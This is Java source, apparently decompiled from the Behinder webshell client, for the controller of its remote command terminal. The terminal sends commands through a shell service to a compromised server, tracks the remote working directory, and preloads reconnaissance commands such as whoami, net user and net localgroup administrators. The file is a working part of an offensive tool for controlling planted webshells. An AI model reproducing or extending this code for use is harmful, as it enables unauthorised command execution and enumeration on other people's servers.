package net.rebeyond.behinder.ui.controller;

import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Map;
import javafx.application.Platform;
import javafx.fxml.FXML;
import javafx.scene.control.Label;
import javafx.scene.control.TextArea;
import javafx.scene.input.KeyCode;
import javafx.scene.input.KeyEvent;
import net.rebeyond.behinder.core.Constants;
import net.rebeyond.behinder.core.ShellService;
import net.rebeyond.behinder.dao.ShellManager;
import net.rebeyond.behinder.utils.Utils;
import org.json.JSONObject;

public class CmdViewController {
   private ShellManager shellManager;
   @FXML
   private TextArea cmdTextArea;
   private ShellService currentShellService;
   private JSONObject shellEntity;
   Map basicInfoMap;
   private List workList;
   private Label statusLabel;
   private int running;
   private int currentPos;
   private int historyIndex;
   private List history = new ArrayList();

   public void init(ShellService shellService, List workList, Label statusLabel, Map basicInfoMap) {
      this.currentShellService = shellService;
      this.shellEntity = shellService.getShellEntity();
      this.basicInfoMap = basicInfoMap;
      this.workList = workList;
      this.statusLabel = statusLabel;
      this.initCmdView();
   }

   private void initCmdView() {
      String currentPath = (String)this.basicInfoMap.get("currentPath");
      this.cmdTextArea.setText(currentPath + " >");
      this.currentPos = this.cmdTextArea.getLength();
      this.initHistory();
   }

   private void initHistory() {
      String[] presetCmdWindows = new String[]{"ipconfig", "netstat -an", "whoami", "ver", "net user", "net localgroup administrators"};
      String[] presetCmdLinux = new String[]{"ifconfig", "id", "uname -a", "ps aux", "netstat -an"};
      if (this.getCurrentOSType() == Constants.OS_TYPE_WINDOWS) {
         this.history.addAll(Arrays.asList(presetCmdWindows));
      } else {
         this.history.addAll(Arrays.asList(presetCmdLinux));
      }

   }

   private String loadHistoryCmd(int index, int direction) {
      String currentHistoryCmd = (String)this.history.get(index);
      this.removeCurrentCmd();
      if (direction == Constants.HISTORY_DIRECTION_UP) {
         int maxHistory = this.history.size() - 1;
         this.cmdTextArea.appendText(currentHistoryCmd);
         if (this.historyIndex < maxHistory) {
            ++this.historyIndex;
         }
      } else if (direction == Constants.HISTORY_DIRECTION_DOWN) {
         this.cmdTextArea.appendText(currentHistoryCmd);
         if (this.historyIndex > 0) {
            --this.historyIndex;
         }
      }

      return (String)this.history.get(index);
   }

   private void addHistory(String cmd) {
      cmd = cmd.trim();
      String lastCmd = (String)this.history.get(0);
      if (!cmd.equals(lastCmd) && !cmd.equals("")) {
         this.history.add(0, cmd);
      }

      this.historyIndex = 0;
   }

   public void onCMDKeyPressed(KeyEvent keyEvent) {
      KeyCode keyCode = keyEvent.getCode();
      if (keyCode == KeyCode.BACK_SPACE) {
         if (this.currentPos >= this.cmdTextArea.getCaretPosition()) {
            keyEvent.consume();
         }
      } else {
         label66: {
            if (keyCode != KeyCode.KP_UP && keyCode != KeyCode.UP) {
               if (keyCode != KeyCode.KP_DOWN && keyCode != KeyCode.DOWN) {
                  break label66;
               }

               this.loadHistoryCmd(this.historyIndex, Constants.HISTORY_DIRECTION_DOWN);
               keyEvent.consume();
               return;
            }

            this.loadHistoryCmd(this.historyIndex, Constants.HISTORY_DIRECTION_UP);
            keyEvent.consume();
            return;
         }
      }

      if (!this.isEditable()) {
         this.cmdTextArea.positionCaret(this.cmdTextArea.getLength());
      }

      if (keyCode == KeyCode.ENTER) {
         this.statusLabel.setText("[!]正在执行命令，请稍后……");
         String cmd = this.getCurrentCmd();
         String cdPath = "";
         if (cmd.startsWith("cd ")) {
            cdPath = cmd.substring(2).trim();
            if (cdPath.equals("..")) {
               cdPath = this.getParentPath(this.getCurrnetPath());
               this.setCurrnetPath(cdPath);
            } else {
               if (cdPath.equals(".")) {
                  this.cmdTextArea.appendText("\n" + this.getCurrnetPath() + " >");
                  keyEvent.consume();
                  return;
               }

               if (cdPath.equals("\\")) {
                  if (this.getCurrentOSType() == Constants.OS_TYPE_WINDOWS) {
                     cdPath = Utils.getRootPath(this.getCurrnetPath());
                  }
               } else {
                  if (cdPath.equals("~")) {
                     String workPath = (String)this.basicInfoMap.get("workPath");
                     this.cmdTextArea.appendText("\n" + workPath + " >");
                     this.setCurrnetPath(workPath);
                     keyEvent.consume();
                     return;
                  }

                  if (!cdPath.startsWith("/") && !cdPath.matches("[A-Za-z]:[\\S]*")) {
                     cdPath = Utils.formatPath(this.getCurrnetPath()) + cdPath;
                  } else {
                     cdPath = Utils.formatPath(cdPath);
                  }
               }
            }
         }

         this.addHistory(cmd);
         final String finalCdPath = cdPath;
         Runnable runner = () -> {
            try {
               final JSONObject resultObj = this.currentShellService.runCmd(this.addPathInfo(cmd), this.getCurrnetPath());
               final String statusText = resultObj.getString("status").equals("fail") ? "[-]命令执行失败。" : "[+]命令执行成功。";
               if (cmd.startsWith("cd ") && resultObj.getString("status").equals("success")) {
                  this.setCurrnetPath(finalCdPath);
               }

               Platform.runLater(new Runnable() {
                  public void run() {
                     CmdViewController.this.statusLabel.setText(statusText);
                     CmdViewController.this.cmdTextArea.appendText("\n" + resultObj.getString("msg") + "\n");
                     CmdViewController.this.cmdTextArea.appendText((String)CmdViewController.this.basicInfoMap.get("currentPath") + " >");
                     CmdViewController.this.currentPos = CmdViewController.this.cmdTextArea.getLength();
                  }
               });
            } catch (final Exception var5) {
               Platform.runLater(new Runnable() {
                  public void run() {
                     CmdViewController.this.statusLabel.setText("[-]操作失败:" + var5.getMessage());
                  }
               });
            }

         };
         Thread workThrad = new Thread(runner);
         this.workList.add(workThrad);
         workThrad.start();
         keyEvent.consume();
      }

   }

   public int getCurrentOSType() {
      String osInfo = (String)this.basicInfoMap.get("osInfo");
      return osInfo.indexOf("windows") < 0 && osInfo.indexOf("winnt") < 0 ? Constants.OS_TYPE_LINUX : Constants.OS_TYPE_WINDOWS;
   }

   private String getCurrentCmd() {
      int lineCount = this.cmdTextArea.getParagraphs().size();
      String lastLine = ((CharSequence)this.cmdTextArea.getParagraphs().get(lineCount - 1)).toString();
      if (lastLine.trim().length() == 0) {
         lastLine = ((CharSequence)this.cmdTextArea.getParagraphs().get(lineCount - 2)).toString();
      }

      int cmdStart = lastLine.indexOf(">") + 1;
      String cmd = lastLine.substring(cmdStart).trim();
      return cmd;
   }

   private boolean isEditable() {
      int lineCount = this.cmdTextArea.getParagraphs().size();
      String lastLine = ((CharSequence)this.cmdTextArea.getParagraphs().get(lineCount - 1)).toString();
      if (lastLine.trim().length() == 0) {
         lastLine = ((CharSequence)this.cmdTextArea.getParagraphs().get(lineCount - 2)).toString();
      }

      int cmdStart = lastLine.indexOf(">") + 1;
      String cmd = lastLine.substring(cmdStart).trim();
      int totalLength = this.cmdTextArea.getText().length();
      return this.cmdTextArea.getCaretPosition() >= totalLength - cmd.length();
   }

   private void removeCurrentCmd() {
      int lineCount = this.cmdTextArea.getParagraphs().size();
      String lastLine = ((CharSequence)this.cmdTextArea.getParagraphs().get(lineCount - 1)).toString();
      if (lastLine.trim().length() == 0) {
         lastLine = ((CharSequence)this.cmdTextArea.getParagraphs().get(lineCount - 2)).toString();
      }

      int cmdStart = lastLine.indexOf(">") + 1;
      String cmd = lastLine.substring(cmdStart).trim();
      int totalLength = this.cmdTextArea.getText().length();
      this.cmdTextArea.deleteText(totalLength - cmd.length(), totalLength);
   }

   private String getCurrnetPath() {
      int lineCount = this.cmdTextArea.getParagraphs().size();
      String lastLine = ((CharSequence)this.cmdTextArea.getParagraphs().get(lineCount - 1)).toString();
      if (lastLine.trim().length() == 0) {
         lastLine = ((CharSequence)this.cmdTextArea.getParagraphs().get(lineCount - 2)).toString();
      }

      return lastLine.substring(0, lastLine.indexOf(">")).trim();
   }

   private void setCurrnetPath(String currentPath) {
      this.basicInfoMap.put("currentPath", currentPath);
   }

   private String getParentPath(String currentPath) {
      String parentPath = currentPath;
      if (!this.isRootPath(currentPath)) {
         File parentFile = (new File(currentPath)).getParentFile();
         if (parentFile != null) {
            parentPath = parentFile.getPath();
         }
      }

      return Utils.formatPath(parentPath);
   }

   private boolean isRootPath(String path) {
      boolean result = false;
      if (path.equals("/") || path.matches("^[A-Za-z]:/$")) {
         result = true;
      }

      return result;
   }

   private String addPathInfo(String cmd) {
      if (this.getCurrentOSType() == Constants.OS_TYPE_WINDOWS) {
         cmd = String.format("cd /d \"%s\"&%s", this.getCurrnetPath().replace("/", "\\"), cmd);
      } else {
         cmd = "cd " + this.getCurrnetPath() + ";" + cmd;
      }

      return cmd;
   }
}
